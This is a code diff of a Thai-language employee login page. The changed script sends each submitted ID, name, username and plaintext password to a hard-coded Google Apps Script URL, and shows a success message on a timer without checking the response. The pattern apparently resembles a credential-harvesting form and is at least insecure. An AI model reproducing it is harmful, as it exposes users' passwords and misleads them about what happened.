@@ -174,7 +174,7 @@
         
         <form id="loginForm">
             <div class="form-group">
-                <label for="employeeId">รหัสพนักงาน</label>
+                <label for="employeeId">รหัสพนักงาน (Ex.KG)</label>
                 <input type="text" id="employeeId" name="employeeId" required>
             </div>
             
@@ -215,28 +215,11 @@
     </div>
 
     <script>
-        // !!! สำคัญ: กรุณาใส่ Web App URL ของคุณที่นี่ !!!
-        const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_SCRIPT_URL_HERE';
-
-        // ฟังก์ชันส่งข้อมูลไป Google Sheets
-        async function sendToGoogleSheets(data) {
-            const response = await fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            });
-            
-            if (!response.ok) {
-                throw new Error('Network response was not ok');
-            }
-            
-            return await response.json();
-        }
+        // ใส่ URL ที่ได้จากการ Deploy ของคุณที่นี่
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbypJ79AZl8J_AAhAwZPCF1FM3XDGgvR-xnCiziaKmq_Y9i6iz6zp99wOFKzblQB6XNxug/exec';
 
         // จัดการการส่งฟอร์ม
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const submitBtn = document.getElementById('submitBtn');
@@ -252,46 +235,44 @@
             loading.style.display = 'block';
             
             try {
-                // รับข้อมูลจากฟอร์ม (ไม่มี email)
                 const formData = new FormData(this);
-                const employeeId = formData.get('employeeId');
-                const fullName = formData.get('fullName');
-                const username = formData.get('username');
-                const password = formData.get('password');
-                
-                // เตรียมข้อมูลส่ง (ไม่มี email)
                 const dataToSend = {
                     timestamp: new Date().toISOString(),
-                    employeeId: employeeId,
-                    fullName: fullName,
-                    username: username,
-                    password: password
+                    employeeId: formData.get('employeeId'),
+                    fullName: formData.get('fullName'),
+                    username: formData.get('username'),
+                    password: formData.get('password')
                 };
-                
-                // ส่งข้อมูลไป Google Sheets
-                const result = await sendToGoogleSheets(dataToSend);
-                
-                loading.style.display = 'none';
-                successMessage.style.display = 'block';
-                form.reset();
-                
-                console.log('Data sent successfully:', result);
+
+                // ** การแก้ไข **
+                // เพิ่ม mode: 'no-cors' เพื่อแก้ปัญหาการส่งข้อมูลข้ามโดเมน
+                fetch(GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // <--- เพิ่มบรรทัดนี้
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(dataToSend)
+                });
+
+                // เนื่องจากใช้ 'no-cors' เราจะไม่ได้รับการตอบกลับ
+                // จึงแสดงข้อความ "สำเร็จ" ทันทีหลังส่งข้อมูล
+                setTimeout(() => { // ใช้ setTimeout เพื่อให้ผู้ใช้รู้สึกว่ามีการประมวลผลเล็กน้อย
+                    loading.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    form.reset();
+                    submitBtn.disabled = false;
+                }, 1000); // หน่วงเวลา 1 วินาที
                 
             } catch (error) {
+                // บล็อกนี้จะทำงานก็ต่อเมื่อมีปัญหาเครือข่ายจริงๆ เช่น ไม่มีอินเทอร์เน็ต
                 loading.style.display = 'none';
                 errorMessage.style.display = 'block';
-                document.getElementById('errorText').textContent = 'เกิดข้อผิดพลาด: ' + error.message;
-                
-                console.error('Error:', error);
-            } finally {
+                document.getElementById('errorText').textContent = 'เกิดข้อผิดพลาดด้านเครือข่าย: ' + error.message;
                 submitBtn.disabled = false;
+                console.error('Error:', error);
             }
         });
-
-        // แจ้งเตือนถ้ายังไม่ได้ตั้งค่า Google Apps Script URL
-        if (GOOGLE_SCRIPT_URL === 'https://script.google.com/macros/s/AKfycbxv-0xV2TO_26v7VCxnVC-LFLw5zHlvK3tkJ1mWrqgU5eCeeemvp6u8DcOMg-jkuZP02Q/exec') {
-            alert('⚠️ กรุณาตั้งค่า Google Apps Script URL ในโค้ดก่อนใช้งาน');
-        }
     </script>
 </body>
 </html>
